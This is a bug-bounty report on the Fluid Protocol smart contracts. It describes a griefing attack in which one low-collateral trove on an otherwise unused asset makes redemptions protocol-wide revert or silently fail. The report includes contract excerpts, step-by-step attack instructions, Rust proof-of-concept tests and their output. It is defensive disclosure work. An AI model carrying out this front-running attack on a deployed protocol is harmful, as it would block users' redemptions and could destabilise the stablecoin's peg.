# #37283 \[SC-Low] Improper Trove Validation Check Allows Low-Cost Griefing Attack to Block Protocol Re

**Submitted on Dec 1st 2024 at 16:23:50 UTC by @InquisitorScythe for** [**IOP | Fluid Protocol**](https://immunefi.com/audit-competition/iop-fluid-protocol)

* **Report ID:** #37283
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Hydrogen-Labs/fluid-protocol/tree/main/contracts/protocol-manager-contract/src/main.sw>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

In the `internal_close_trove function`, there is a check called `require_more_than_one_trove_in_system`. Under certain special circumstances, this check can prevent legitimate redeem processes from occurring. An attacker can exploit this to block large redemptions through the protocol by a major holder at an extremely low cost, thereby damaging protocol revenue and potentially causing USDF to depeg.

## Vulnerability Details

The documentation states "Any USDF holder can redeem for underlying collateral at any time", however, I found this is not true in the code implementation. When there is only one trove for a certain asset and its MCR (Minimum Collateral Ratio) is the lowest globally, any redemption attempt will fail.

Let's look at the code, anyone can called `redeem_collateral`. This function will call `find_min_borrower` to find the borrower/trove with minimal collateral ratio\[1], and then start to redeem collateral in a loop\[2], if redeem is cancel partially, it will break the loop and skip remaining troves.

```rust
    #[storage(read, write), payable] 
    fn redeem_collateral(
        max_iterations: u64,
        partial_redemption_hint: u64,
        upper_partial_hint: Identity,
        lower_partial_hint: Identity,
    ) {
        require(
            storage
                .lock_redeem_collateral
                .read() == false,
            "ProtocolManager: Redeem collateral is locked",
        );
        storage.lock_redeem_collateral.write(true);

        require_valid_usdf_id();
        require(
            msg_amount() > 0,
            "ProtocolManager: Redemption amount must be greater than 0",
        );
        let usdf_contract_cache = storage.usdf_token_contract.read();
        let fpt_staking_contract_cache = storage.fpt_staking_contract.read();
        let usdf = abi(SRC3, usdf_contract_cache.bits());
        let sorted_troves = abi(SortedTroves, storage.sorted_troves_contract.read().bits());
        let active_pool = abi(ActivePool, storage.active_pool_contract.read().bits());
        let fpt_staking = abi(FPTStaking, fpt_staking_contract_cache.bits());
        let mut assets_info = get_all_assets_info();
        let mut remaining_usdf = msg_amount();
        let (mut current_borrower, mut index) = find_min_borrower(assets_info.current_borrowers, assets_info.current_crs); // [1]
        let mut remaining_iterations = max_iterations;

        // Iterate through troves, redeeming collateral until conditions are met
        while (current_borrower != null_identity_address() && remaining_usdf > 0 && remaining_iterations > 0) { // [2]
            let contracts_cache = assets_info.asset_contracts.get(index).unwrap();
            let trove_manager_contract = abi(TroveManager, contracts_cache.trove_manager.bits());
            let price = assets_info.prices.get(index).unwrap();
            let mut totals = assets_info.redemption_totals.get(index).unwrap();
            remaining_iterations -= 1;
            let next_user_to_check = sorted_troves.get_prev(current_borrower, contracts_cache.asset_address);

            // Apply pending rewards to ensure up-to-date trove state
            trove_manager_contract.apply_pending_rewards(current_borrower);

            // Attempt to redeem collateral from the current trove
            let single_redemption = trove_manager_contract.redeem_collateral_from_trove(
                current_borrower,
                remaining_usdf,
                price,
                partial_redemption_hint,
                upper_partial_hint,
                lower_partial_hint,
            );

            // Break if partial redemption was cancelled
            if (single_redemption.cancelled_partial) {
                break; // [3]
            }
```

`redeem_collateral_from_trove` -> `internal_redeem_collateral_from_trove` do the job internally. There are two cases:

1. if `single_redemption_values.usdf_lot` can cover the trove's debt, the trove can be closed.
2. otherwise, if `new_debt < MIN_NET_DEBT`, it returns early and marked `cancelled_partial=true`, which will break the loop in `redeem_collateral`.

So, if evildoer can open a trove could not be closed normally, any attempt to redeem collateral will not success.

```rust
#[storage(read, write)]
fn internal_redeem_collateral_from_trove(
    borrower: Identity,
    max_usdf_amount: u64,
    price: u64,
    partial_redemption_hint: u64,
    upper_partial_hint: Identity,
    lower_partial_hint: Identity,
) -> SingleRedemptionValues {
    // Prevent reentrancy
    require(
        storage
            .lock_internal_redeem_collateral_from_trove
            .read() == false,
        "TroveManager: Internal redeem collateral from trove is locked",
    );
    storage
        .lock_internal_redeem_collateral_from_trove
        .write(true);
    let mut single_redemption_values = SingleRedemptionValues::default();
    let sorted_troves = abi(SortedTroves, storage.sorted_troves_contract.read().into());
    let asset_contract_cache = storage.asset_contract.read();
    // Get the trove details for the borrower
    let trove = storage.troves.get(borrower).read();
    // Calculate the amount of USDF to redeem (capped by max_usdf_amount or trove's debt)
    single_redemption_values.usdf_lot = fm_min(max_usdf_amount, trove.debt);
    // Calculate the corresponding amount of asset to redeem based on the current price
    single_redemption_values.asset_lot = fm_multiply_ratio(single_redemption_values.usdf_lot, DECIMAL_PRECISION, price);
    // Calculate the new debt and collateral amounts after redemption
    let new_debt = trove.debt - single_redemption_values.usdf_lot;
    let new_coll = trove.coll - single_redemption_values.asset_lot;
    // If the trove's debt is fully redeemed, close the trove
    if (new_debt == 0) {
        internal_remove_stake(borrower);
        internal_close_trove(borrower, Status::ClosedByRedemption);
        internal_redeem_close_trove(borrower, 0, new_coll);
    } else {
        // Calculate the new nominal collateralization ratio
        let new_nicr = fm_compute_nominal_cr(new_coll, new_debt);
        // If the new debt is below the minimum allowed, cancel the partial redemption
        if (new_debt < MIN_NET_DEBT) {
            single_redemption_values.cancelled_partial = true;
            return single_redemption_values;
        }
        // Re-insert the trove into the sorted list with its new NICR
        sorted_troves.re_insert(
            borrower,
            new_nicr,
            upper_partial_hint,
            lower_partial_hint,
            asset_contract_cache,
        );
        // Update the trove's debt and collateral in storage
        let mut trove = storage.troves.get(borrower).read();
        trove.debt = new_debt;
        trove.coll = new_coll;
        storage.troves.insert(borrower, trove);
        // Update the stake and total stakes
        internal_update_stake_and_total_stakes(borrower);
    }
```

in `internal_close_trove`, there is a check called `require_more_than_one_trove_in_system`. Instead of checking whether more than one trove in the protocol as it suggested, it only check for one asset.

```rust
#[storage(read)]
fn require_more_than_one_trove_in_system(
    trove_owner_array_length: u64,
    asset_contract: AssetId,
    sorted_troves_contract: ContractId,
) {
    let sorted_troves = abi(SortedTroves, sorted_troves_contract.into());
    let size = sorted_troves.get_size(asset_contract);
    require(
        trove_owner_array_length > 1 && size > 1,
        "TroveManager: There is only one trove in the system",
    );
}
```

So here is the situation when all redemption can be blocked.

1. User A wants to redeem a large amount of USDF, say 100k, through the fluid protocol.
2. Evildoer E can always front run and block the redemption with following step: a. Identify the asset with no trove opened, let say xxETH is this case. b. Open a trove with globally minimal cr, and only slightly larger than MIN\_NET\_DEBT; e.g., if price of asset xxETH is 1. then evildoer can create a debt of 500 USDF with 679 xxETH, then he has a trove with 135.12% cr.
3. User A can't redeem 100k, because `internal_redeem_collateral_from_trove` falls into situation 1, but the trove could not be closed. Reverted by `require_more_than_one_trove_in_system`.
4. User B wants to redeem a small amount of USDF, say 100. It is also not possible. Because `internal_redeem_collateral_from_trove` falls into situation 2, the redeem loop breaks early.

Notice that, even xxETH has already some troves open, the evildoer can front run to redeem those troves, only left one trove to block the redemption.

## Impact Details

Let's talk about the impact.

1. Evildoer can always front run to block redemption with relatively low cost: The redemption no longer depends on the overall staking depth, but rather on the number of stakes in a specific asset. In a situation where there are no troves for a particular asset, an evildoer only needs to pay 500\*0.5%=2.5 USDF as an opening fee to prevent redemption operations across the entire protocol.
2. The prevention of redemption is hard to recover: In cases where certain assets lack liquidity, this deadlock situation is very difficult to break.
3. The prevention of redemption is harmful for the robustness and stability of protocol, could leads to USDF depeg: With the loss of the redemption channel that was promised in the initial protocol design, USDF's credibility will suffer, liquidity will decrease, and ultimately lead to depegging consequences.

The fix suggestion is remove `require_more_than_one_trove_in_system` checks, or implement it across all assets.

## References

Add any relevant links to documentation or code

## Proof of Concept

Create a new tes file in `contracts/protocol-manager-contract/tests/test_redemptions.rs`

```rust
use fuels::types::Identity;
use test_utils::data_structures::{ContractInstance, PRECISION};
use test_utils::interfaces::borrow_operations::borrow_operations_utils;
use test_utils::interfaces::oracle::oracle_abi;
use test_utils::interfaces::protocol_manager::ProtocolManager;
use test_utils::interfaces::pyth_oracle::PYTH_TIMESTAMP;
use test_utils::{
    interfaces::{
        active_pool::active_pool_abi,
        protocol_manager::protocol_manager_abi,
        pyth_oracle::{pyth_oracle_abi, pyth_price_feed},
        trove_manager::trove_manager_utils,
        trove_manager::trove_manager_abi,
    },
    setup::common::setup_protocol,
    utils::with_min_borrow_fee,
};

#[tokio::test]
async fn failed_redemption_case1() {
    let (contracts, _admin, mut wallets) = setup_protocol(5, true, false).await;

    let wallet1 = wallets.pop().unwrap();
    let wallet2 = wallets.pop().unwrap();
    let wallet3 = wallets.pop().unwrap();
    let wallet4 = wallets.pop().unwrap(); // attacker;

    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[0].oracle, PYTH_TIMESTAMP).await;
    pyth_oracle_abi::update_price_feeds(
        &contracts.asset_contracts[0].mock_pyth_oracle,
        pyth_price_feed(1),
    ).await;

    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[1].oracle, PYTH_TIMESTAMP).await;
    pyth_oracle_abi::update_price_feeds(
        &contracts.asset_contracts[1].mock_pyth_oracle,
        pyth_price_feed(1),
    ).await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet1.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        20_000 * PRECISION,
        10_000 * PRECISION,
    ).await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet2.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        9_000 * PRECISION,
        5_000 * PRECISION,
    )
    .await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet3.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        8_000 * PRECISION,
        5_000 * PRECISION,
    )
    .await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet4.clone(),
        &contracts.asset_contracts[1],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        679* PRECISION,
        500 * PRECISION,
    )
    .await;

    // 2st corllateral
    // 1k FUEL > 679 FUEL
    // 500 USDF > 500 USDF + (fees)


    let icr = trove_manager_abi::get_nominal_icr(
        &contracts.asset_contracts[1].trove_manager,
        Identity::Address(wallet4.address().into()),
    )
    .await
    .value;

    println!("wallet4 Initial ICR: {}", icr);

    let pos = trove_manager_abi::get_entire_debt_and_coll(&contracts.asset_contracts[1].trove_manager, Identity::Address(wallet4.address().into()))
        .await
        .value;
    println!("wallet4 pos: {:?}", pos);

    let redemption_amount = 1000 * PRECISION;

    let protocol_manager_wallet1 = ContractInstance::new(
        ProtocolManager::new(
            contracts.protocol_manager.contract.contract_id().clone(),
            wallet1.clone(),
        ),
        contracts.protocol_manager.implementation_id,
    );

    let mut pos1 = trove_manager_abi::get_entire_debt_and_coll(&contracts.asset_contracts[0].trove_manager, Identity::Address(wallet1.address().into()))
        .await
        .value;
    println!("wallet1 pos: {:?}", pos1);

    let res = protocol_manager_abi::redeem_collateral(
        &protocol_manager_wallet1,
        redemption_amount,
        20,
        0,
        None,
        None,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.coll_surplus_pool,
        &contracts.default_pool,
        &contracts.active_pool,
        &contracts.sorted_troves,
        &contracts.asset_contracts,
    )
    .await;
    let logs = res.decode_logs();
    println!("logs: {:?}", logs);
}

#[tokio::test]
async fn failed_redemption_case2() {
    let (contracts, _admin, mut wallets) = setup_protocol(5, true, false).await;

    let wallet1 = wallets.pop().unwrap();
    let wallet2 = wallets.pop().unwrap();
    let wallet3 = wallets.pop().unwrap();
    let wallet4 = wallets.pop().unwrap(); // attacker;

    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[0].oracle, PYTH_TIMESTAMP).await;
    pyth_oracle_abi::update_price_feeds(
        &contracts.asset_contracts[0].mock_pyth_oracle,
        pyth_price_feed(1),
    ).await;

    oracle_abi::set_debug_timestamp(&contracts.asset_contracts[1].oracle, PYTH_TIMESTAMP).await;
    pyth_oracle_abi::update_price_feeds(
        &contracts.asset_contracts[1].mock_pyth_oracle,
        pyth_price_feed(1),
    ).await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet1.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        20_000 * PRECISION,
        10_000 * PRECISION,
    ).await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet2.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        9_000 * PRECISION,
        5_000 * PRECISION,
    )
    .await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet3.clone(),
        &contracts.asset_contracts[0],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        8_000 * PRECISION,
        5_000 * PRECISION,
    )
    .await;

    borrow_operations_utils::mint_token_and_open_trove(
        wallet4.clone(),
        &contracts.asset_contracts[1],
        &contracts.borrow_operations,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.active_pool,
        &contracts.sorted_troves,
        679* PRECISION,
        500 * PRECISION,
    )
    .await;

    // 2st corllateral
    // 1k FUEL > 679 FUEL
    // 500 USDF > 500 USDF + (fees)


    let icr = trove_manager_abi::get_nominal_icr(
        &contracts.asset_contracts[1].trove_manager,
        Identity::Address(wallet4.address().into()),
    )
    .await
    .value;

    println!("wallet4 Initial ICR: {}", icr);

    let pos = trove_manager_abi::get_entire_debt_and_coll(&contracts.asset_contracts[1].trove_manager, Identity::Address(wallet4.address().into()))
        .await
        .value;
    println!("wallet4 pos: {:?}", pos);

    let redemption_amount = 100 * PRECISION;

    let protocol_manager_wallet1 = ContractInstance::new(
        ProtocolManager::new(
            contracts.protocol_manager.contract.contract_id().clone(),
            wallet1.clone(),
        ),
        contracts.protocol_manager.implementation_id,
    );

    let mut pos1 = trove_manager_abi::get_entire_debt_and_coll(&contracts.asset_contracts[0].trove_manager, Identity::Address(wallet1.address().into()))
        .await
        .value;
    println!("wallet1 pos: {:?}", pos1);

    let res = protocol_manager_abi::redeem_collateral(
        &protocol_manager_wallet1,
        redemption_amount,
        20,
        0,
        None,
        None,
        &contracts.usdf,
        &contracts.fpt_staking,
        &contracts.coll_surplus_pool,
        &contracts.default_pool,
        &contracts.active_pool,
        &contracts.sorted_troves,
        &contracts.asset_contracts,
    )
    .await;
    let logs = res.decode_logs();
    println!("logs: {:?}", logs);

    let provider = wallet1.provider().unwrap();
    pos1 = trove_manager_abi::get_entire_debt_and_coll(&contracts.asset_contracts[0].trove_manager, Identity::Address(wallet1.address().into()))
        .await
        .value;
    println!("wallet1 pos: {:?}", pos1);

    let wallet1_balance0 = provider.get_asset_balance(wallet1.address(), contracts.asset_contracts[0].asset_id ).await.unwrap();
    println!("wallet1 balance0: {}", wallet1_balance0);
    let wallet1_balance1 = provider.get_asset_balance(wallet1.address(), contracts.asset_contracts[1].asset_id).await.unwrap();
    println!("wallet1 balance1: {}", wallet1_balance1);
    let usdf = provider.get_asset_balance(wallet1.address(), contracts.usdf_asset_id).await.unwrap();
    println!("wallet1 usdf balance: {}", usdf);

}
```

* run `cargo test -- --nocapture failed_redemption_case1`, the output shows that redemption revert, even there are enough collateral for the requested 1000 amount.

```
Deploying core contracts...
Initializing core contracts...
wallet4 Initial ICR: 1351243781
wallet4 pos: (502500000000, 679000000000, 0, 0)
wallet1 pos: (10050000000000, 20000000000000, 0, 0)
thread 'failed_redemption_case1' panicked at /data/fluid-protocol/test-utils/src/interfaces/protocol_manager.rs:214:14:
called `Result::unwrap()` on an `Err` value: Transaction(Reverted { reason: "AsciiString { data: \"TroveManager: There is only one trove in the system\" }", revert_id: 18446744073709486080, receipts: [Call { id: 0000000000000000000000000000000000000000000000000000000000000000, to: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, amount: 1000000000000, asset_id: 7128dac0183b90ad979d008cf7d572282e54b23ae074f2045d86a41c1ffb4cae, gas: 1999742, param1: 10480, param2: 10505, pc: 18840, is: 18840 }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: d13b83d7a6eb4e41cf4686d078019624e4324efaddf83e9d9bd647c9d2723a23, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1980470, param1: 67101824, param2: 67100800, pc: 136048, is: 136048 }, Call { id: d13b83d7a6eb4e41cf4686d078019624e4324efaddf83e9d9bd647c9d2723a23, to: 48d43a47280d34d3aa90d826122fcad0a315614c0f73d242e8d7a63687a2d8d5, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1976491, param1: 67098176, param2: 67097152, pc: 187993, is: 187993 }, ReturnData { id: 48d43a47280d34d3aa90d826122fcad0a315614c0f73d242e8d7a63687a2d8d5, ptr: 67094592, len: 28, digest: a9dd65fcff83b6bccf652da94d61edd8632ff002061afc77e498266005f6be0c, pc: 190029, is: 187993, data: Some(00000000000000000000000900...) }, ReturnData { id: d13b83d7a6eb4e41cf4686d078019624e4324efaddf83e9d9bd647c9d2723a23, ptr: 67092800, len: 8, digest: 59f603c39018dc65fbf3007d91985355b0e27df2993aab3c4a9e4b5ea36c5996, pc: 153332, is: 136048, data: Some(000000003b9aca00) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1970366, param1: 67091520, param2: 67090496, pc: 135488, is: 135488 }, ReturnData { id: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, ptr: 67087104, len: 40, digest: ea74a1155359165b175e6b127fa7c4c341aaa1179234bfc620e5c43fa2bc1969, pc: 156480, is: 135488, data: Some(00000000000000005d99ee966b...) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: 02d0d636cc7a049399e8289c8a14c8796df872e132c8c4e8b427eae73e370b74, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1962722, param1: 67086080, param2: 67085056, pc: 136288, is: 136288 }, ReturnData { id: 02d0d636cc7a049399e8289c8a14c8796df872e132c8c4e8b427eae73e370b74, ptr: 67079921, len: 8, digest: a288e93d8a680ea89431f8e7d03e6e9ee4a4c7df535f475fdd41bd8da7b84093, pc: 167164, is: 136288, data: Some(000000005ee49978) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: 02d0d636cc7a049399e8289c8a14c8796df872e132c8c4e8b427eae73e370b74, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1883599, param1: 67078889, param2: 67077865, pc: 136048, is: 136048 }, Call { id: 02d0d636cc7a049399e8289c8a14c8796df872e132c8c4e8b427eae73e370b74, to: bbd3ac99ce7afd07e533384ba1363504f1888f1c25ad3f299ef733eef9d17f14, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1877562, param1: 67074729, param2: 67073705, pc: 279448, is: 279448 }, ReturnData { id: bbd3ac99ce7afd07e533384ba1363504f1888f1c25ad3f299ef733eef9d17f14, ptr: 67070569, len: 8, digest: 9e381234744c5b7dd2472f15f52823e64036185801885fef38eb11407fc13fb2, pc: 299356, is: 279448, data: Some(00001247e55c2800) }, Call { id: 02d0d636cc7a049399e8289c8a14c8796df872e132c8c4e8b427eae73e370b74, to: d680de7f6ab0a170665039b664042b0797f86d395552aa693b39ea38708026d8, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1870724, param1: 67069289, param2: 67068265, pc: 279448, is: 279448 }, ReturnData { id: d680de7f6ab0a170665039b664042b0797f86d395552aa693b39ea38708026d8, ptr: 67065129, len: 8, digest: af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc, pc: 296908, is: 279448, data: Some(0000000000000000) }, ReturnData { id: 02d0d636cc7a049399e8289c8a14c8796df872e132c8c4e8b427eae73e370b74, ptr: 67064105, len: 8, digest: 9e381234744c5b7dd2472f15f52823e64036185801885fef38eb11407fc13fb2, pc: 165844, is: 136048, data: Some(00001247e55c2800) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: e2364e0e2b08255adb438c9b6f33be8b9433e4dc9169e7279f38f9c12de1bafe, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1863008, param1: 67062969, param2: 67061945, pc: 136048, is: 136048 }, Call { id: e2364e0e2b08255adb438c9b6f33be8b9433e4dc9169e7279f38f9c12de1bafe, to: 2c2ec98293c88139f80465a64814da52aa4e2c5bde8c2b5cf418fc5c66cbdf3c, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1859029, param1: 67059321, param2: 67058297, pc: 187993, is: 187993 }, ReturnData { id: 2c2ec98293c88139f80465a64814da52aa4e2c5bde8c2b5cf418fc5c66cbdf3c, ptr: 67055737, len: 28, digest: a9dd65fcff83b6bccf652da94d61edd8632ff002061afc77e498266005f6be0c, pc: 190029, is: 187993, data: Some(00000000000000000000000900...) }, ReturnData { id: e2364e0e2b08255adb438c9b6f33be8b9433e4dc9169e7279f38f9c12de1bafe, ptr: 67053945, len: 8, digest: 59f603c39018dc65fbf3007d91985355b0e27df2993aab3c4a9e4b5ea36c5996, pc: 153332, is: 136048, data: Some(000000003b9aca00) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1852904, param1: 67052665, param2: 67051641, pc: 135488, is: 135488 }, ReturnData { id: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, ptr: 67048249, len: 40, digest: 6905085070841ddc8a266f5c2ae6b0cfb8a62a241f1befeaaac9df3340c3f094, pc: 156480, is: 135488, data: Some(000000000000000009c0b2d1a4...) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1845260, param1: 67047225, param2: 67046201, pc: 136288, is: 136288 }, ReturnData { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, ptr: 67041066, len: 8, digest: 291dbd644a5685bbb7738574c01de65377be4a08883c1a03745d55e7855e29e4, pc: 167164, is: 136288, data: Some(00000000508a5805) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1766759, param1: 67040026, param2: 67039002, pc: 136048, is: 136048 }, Call { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, to: bbd3ac99ce7afd07e533384ba1363504f1888f1c25ad3f299ef733eef9d17f14, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1760722, param1: 67035866, param2: 67034842, pc: 279448, is: 279448 }, ReturnData { id: bbd3ac99ce7afd07e533384ba1363504f1888f1c25ad3f299ef733eef9d17f14, ptr: 67031706, len: 8, digest: de9e76875fa9436b81d767d1f3fbe816a7209f991aa9d871783d535b0ba77ac1, pc: 299356, is: 279448, data: Some(00000074ff558100) }, Call { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, to: d680de7f6ab0a170665039b664042b0797f86d395552aa693b39ea38708026d8, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1753884, param1: 67030426, param2: 67029402, pc: 279448, is: 279448 }, ReturnData { id: d680de7f6ab0a170665039b664042b0797f86d395552aa693b39ea38708026d8, ptr: 67026266, len: 8, digest: af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc, pc: 296908, is: 279448, data: Some(0000000000000000) }, ReturnData { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, ptr: 67025242, len: 8, digest: de9e76875fa9436b81d767d1f3fbe816a7209f991aa9d871783d535b0ba77ac1, pc: 165844, is: 136048, data: Some(00000074ff558100) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1743995, param1: 67023738, param2: 67022714, pc: 125536, is: 125536 }, ReturnData { id: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, ptr: 67018739, len: 40, digest: 2c34ce1df23b838c5abf2a7f6437cca3d3067ed509ff25f11df6b11b582b51eb, pc: 145708, is: 125536, data: Some(00000000000000000000000000...) }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1734690, param1: 67017715, param2: 67016691, pc: 125312, is: 125312 }, ReturnData { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, ptr: 0, len: 0, digest: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855, pc: 157656, is: 125312, data: Some() }, Call { id: 5b02db3d962463409b8935f13fb1b15db073295696424e0a0e5e50f53b371fa7, to: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1722570, param1: 67011881, param2: 67010857, pc: 125976, is: 125976 }, Call { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, to: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, amount: 0, asset_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1636652, param1: 67002906, param2: 67001882, pc: 283384, is: 283384 }, ReturnData { id: 89e8b4bfe7f50aa25d65c417804ed4f7f4a596a25d76310e26f1f0914c227ae2, ptr: 66998746, len: 8, digest: cd2662154e6d76b2b2b92e70c0cac3ccf534f9b74eb5b89819ec509083d00a50, pc: 303220, is: 283384, data: Some(0000000000000001) }, LogData { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, ra: 0, rb: 10098701174489624218, ptr: 66997722, len: 59, digest: 6587611b3d2cf84e720a622322b1dd651b200bfa0dd717cdcd1329aea0d985b7, pc: 170312, is: 125976, data: Some(000000000000003354726f7665...) }, Revert { id: dcccd505e9e4a3aee7e736f0d359b33cf11a0ef2bb70c8e36831aeafd15c5535, ra: 18446744073709486080, pc: 170320, is: 125976 }, ScriptResult { result: Revert, gas_used: 370006 }] })
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
test failed_redemption_case1 ... FAILED
```

* run `cargo test -- --nocapture failed_redemption_case2`, this time wallet1 try to redeem 100 USDF. The output shows that, though it did not revert, redeemer wallet1's balance did not change at all. The redemption failed without error message.

```
Deploying core contracts...
Initializing core contracts...
wallet4 Initial ICR: 1351243781
wallet4 pos: (502500000000, 679000000000, 0, 0)
wallet1 pos: (10050000000000, 20000000000000, 0, 0)
logs: LogResult { results: [Ok("SingleRedemptionEvent { borrower: Address(09c0b2d1a486c439a87bcba6b46a7a1a23f3897cc83a94521a96da5c23bc58db), remaining_usdf: 100000000000, price: 1000000000, is_partial: true }"), Ok("TotalSupplyEvent { asset: 943c8187bf3e4ee917e0499a4b74a18989dcb0f81055e730cb9e5e306f5ac796, supply: 20602500000000, sender: ContractId(8531451cbb81975d73176dec9f7a021425b2b73e45de3f7ca6195b7a28921271) }")] }
wallet1 pos: (10050000000000, 20000000000000, 0, 0)
wallet1 balance0: 0
wallet1 balance1: 0
wallet1 usdf balance: 10000000000000
test failed_redemption_case2 ... ok
```
